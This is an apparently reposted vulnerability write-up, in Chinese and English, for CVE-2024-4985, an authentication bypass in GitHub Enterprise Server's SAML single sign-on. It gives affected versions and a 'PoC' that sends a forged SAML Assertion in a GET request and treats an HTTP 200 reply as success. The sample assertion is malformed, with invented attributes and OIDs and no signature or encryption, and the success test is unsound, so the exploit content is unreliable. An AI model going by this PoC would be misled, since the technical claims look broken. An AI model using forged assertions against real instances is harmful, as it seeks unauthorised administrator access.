# CVE-2024-4985

>GitHub Enterprise Server是一个用于企业内软件开发的自托管平台，团队可使用GitHub Enterprise Server通过Git版本控制、强大的API、生产力和协作工具以及集成来构建和发布软件。

The authentication bypass vulnerability in GitHub Enterprise Server (GHES) allows an unauthorized attacker to access an instance of GHES without requiring pre-authentication. The vulnerability affects all GHES versions prior to 3.13.0.

## Technical vulnerability details:
The vulnerability exploits a vulnerability in the way GHES handles encrypted SAML claims.
An attacker could create a fake SAML claim that contains correct user information.
When GHES processes a fake SAML claim, it will not be able to validate its signature correctly, allowing an attacker to gain access to the GHES instance.

## 来源

[https://github.com/absholi7ly/Bypass-authentication-GitHub-Enterprise-Server](https://github.com/absholi7ly/Bypass-authentication-GitHub-Enterprise-Server)

## 简介

GitHub Enterprise Server中存在身份验证绕过漏洞，在使用带有可选加密断言功能的SAML单点登录身份验证的GHES实例上，威胁者可以伪造SAML响应，绕过身份验证机制并提供或获取站点管理员权限，成功利用该漏洞可能导致未授权访问、敏感信息泄露等。

## 漏洞类型

身份验证绕过

## 影响范围

-   GitHub Enterprise Server < 3.13.0
-   GitHub Enterprise Server 3.9 < 3.9.15
-   GitHub Enterprise Server 3.10 < 3.10.12
-   GitHub Enterprise Server 3.11 < 3.11.10
-   GitHub Enterprise Server 3.12 < 3.12.4

## Poc:

Steps:
* Open your penetration tester.
* Create a Web Connection Request. 
* Select the "GET" request type.
* Enter your GHES URL.
* Add a fake SAML Assertion parameter to your request. You can find an example of a fake SAML Assertion parameter in the GitHub documentation.
* Check the GHES response.
* If the response contains an HTTP status code of 200, it has successfully bypassed authentication using the fake SAML Assertion parameter.
* If the response contains a different HTTP status code, it did not succeed in bypassing authentication.

------------------------------------------------------------------
Note: I'm going to synthesize an example using a dummy URL (https://your-ghes-instance.com). Be sure to replace it with your real GHES URL.
In this example, we'll assume that your GHES URL is https://your-ghes-instance.com. We'll use a fake SAML Assertion parameter that looks like this:

```
<Assertion ID="1234567890" IssueInstant="2024-05-21T06:40:00Z" Subject="CN=John Doe,OU=Users,O=Acme Corporation,C=US">
  <Audience>https://your-ghes-instance.com</Audience>
  <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:assertion:method:bearer">
    <SubjectConfirmationData>
      <NameID Type="urn:oasis:names:tc:SAML:2.0:nameid-type:persistent" Format="urn:oasis:names:tc:SAML:2.0:nameid-format:basic">jdoe</NameID>
    </SubjectConfirmationData>
  </SubjectConfirmation>
  <AuthnStatement AuthnInstant="2024-05-21T06:40:00Z" AuthnContextClassRef="urn:oasis:names:tc:SAML:2.0:assertion:AuthnContextClassRef:unspecified">
    <AuthnMethod>urn:oasis:names:tc:SAML:2.0:methodName:password</AuthnMethod>
  </AuthnStatement>
  <AttributeStatement>
    <Attribute Name="urn:oid:1.3.6.1.4.1.11.2.17.19.3.4.0.10">Acme Corporation</Attribute>
    <Attribute Name="urn:oid:1.3.6.1.4.1.11.2.17.19.3.4.0.4">jdoe@acme.com</Attribute>
  </AttributeStatement>
</Assertion>
```
